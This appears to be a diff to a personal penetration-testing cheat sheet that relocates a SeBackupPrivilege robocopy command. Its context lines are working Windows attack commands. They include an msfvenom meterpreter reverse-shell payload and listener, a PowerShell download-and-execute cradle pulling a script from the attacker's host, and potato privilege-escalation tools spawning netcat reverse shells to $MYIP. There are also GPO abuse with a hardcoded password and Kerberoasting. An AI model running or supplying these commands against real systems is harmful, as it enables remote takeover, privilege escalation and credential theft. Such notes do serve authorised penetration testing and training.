@@ -1160,7 +1160,10 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f psh -o
 rlwrap msfconsole -q -x "use multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST $MYIP; set LPORT 5555; run"
 powershell -c "IEX (New-Object Net.WebClient).DownloadString('http://$MYIP:8888/windows/0.ps1')"
 
-+---------- Potatos (SeImpersonatePrivilege) ----------+
++---------- SeBackupPrivilege ----------+
+robocopy /b \Users\Administrator\Desktop .
+
++---------- SeImpersonatePrivilege ----------+
 C:\programdata\FullPowers.exe -c "C:\programdata\EfsPotato.exe \"C:\programdata\nc.exe $MYIP 5555 -e cmd\"" -z
 C:\programdata\EfsPotato.exe "C:\programdata\nc.exe $MYIP 5555 -e cmd"
 C:\programdata\SigmaPotato.exe "C:\programdata\nc.exe $MYIP 5555 -e cmd"
@@ -1303,9 +1306,6 @@ python3 pygpoabuse.py -dc-ip $TARGET $DOM/'gpoadm':'123qweasdF!' -gpo-id '31b2f3
 gpoupdate /force
 
 Set-DomainObject -Identity $USERNAME -SET @{serviceprincipalname='SET/SET'}; Get-DomainSPNTicket -spn SET/SET
-
-[*] SeBackupPrivilege
-robocopy /b \Users\Administrator\Desktop .
 
 [*] Shells
 +---------- MSFVenom ----------+
